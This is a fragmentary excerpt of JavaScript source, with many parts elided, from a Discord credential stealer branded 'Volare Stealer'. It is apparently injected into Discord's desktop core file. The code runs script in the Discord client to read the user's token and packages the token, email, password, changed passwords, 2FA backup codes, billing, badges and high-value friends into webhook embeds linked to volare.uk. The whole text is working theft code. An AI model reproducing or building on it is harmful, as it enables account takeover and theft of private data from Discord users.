...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
				...
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						embeds: [{
							...
							fields: [{
								name: "Info",
								value: `Discord successfully initalized. ${computerName} (discord_desktop_core-*/index.js)`,
								inline: !1
							}],
							author: {
								name: "Volare Stealer",
                                iconURL: "https://cdn.discordapp.com/avatars/818831099568193619/a_328b66e5369763c408aef36cb8a05553.gif"
							},
							footer: {
								text: "volare.uk"
							}
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							content: "",
							embeds: [{
								description: "[**<:partner:909102089513340979> │ Copy Token**](https://volare.uk/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "<:volare:935999682541400074> Token",
									value: `\`${token}\``,
									inline: !1
								}, {
									name: "Badges",
		...
		if (!fs.existsSync(path.join(__dirname, "VolareLLC"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "VolareLLC"));
		return !1
	}))
}
const Filter = {
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://volare.uk/raw/"
							...
							var params = {
								...
								content: "",
								embeds: [{
									description: "[**<:partner:909102089513340979> │ Copy Token**](https://volare.uk/raw/"+ token +"<br>"+ password+")",
									color: config['embed-color'],
									fields: [{
										name: "<:volare:935999682541400074> Token",
										value: `\`\`\`${token}\`\`\``,
										...
										name: "<a:volare:936002789669224458> Nitro Type",
										value: `${GetNitro(json.premium_type)}`,
										inline: !0
									}, {
										name: "<a:volare:936000654911098931> Badges",
										value: `${GetBadges(json.flags)}`,
										inline: !1
									}, {
										name: "<a:volare:936000679259033661> Billing",
										value: `${Cool()}`,
										inline: !1
									}, {
										name: "<a:volare:936000680215322686> Email",
										value: `\`${email}\``,
										inline: !0
									}, {
										name: "<a:volare:936000661240299532> Password",
										value: `\`${password}\``,
										inline: !0
									}],
                                    author: {
							...
							var mfaembed = {
								...
								fields: fieldo,
								author: {
									name: `<a:volare:936005268171534437> _2FA Codes_`,
                                    iconURL: "https://cdn.discordapp.com/avatars/818831099568193619/a_328b66e5369763c408aef36cb8a05553.gif"
								},
                                footer: {
                                    text: "volare.uk"
            ...
            xmlHttp.responseText`, !0).then((info4) => {
										...
										var params = {
                                            ...
                                            embeds: [{
												...
												description: CalcFriends(),
												author: {
													name: `HQ Friends (${CalcFriends().length})`,
                                                    iconURL: "https://cdn.discordapp.com/avatars/818831099568193619/a_328b66e5369763c408aef36cb8a05553.gif"
												},
												footer: {
													text: "volare.uk"
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								content: "",
								embeds: [{
									description: "[**<:partner:909102089513340979> │ Copy Token**](https://volare.uk/raw/"+ token +"<br>"+ newpassword+")",
									color: config['embed-color'],
									fields: [{
                                        name: "<:volare:935999682541400074> Token",
                                        value: `\`\`\`${token}\`\`\``,
                                        ...
                                        name: "<a:volare:936000661240299532> New Password",
                                        value: `\`${newpassword}\``,
                                        inline: !0
                                    }],
                                    author: {
									...
									footer: {
										text: "volare.uk (Event: Password Changed)"
									},
									thumbnail: {
										url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									title: `HQ Friends (${CalcFriends().length})`,
									color: config['embed-color'],
									description: CalcFriends(),
                                    author: {
                                        name: `${json.username}#${json.discriminator} (${json.id})`,
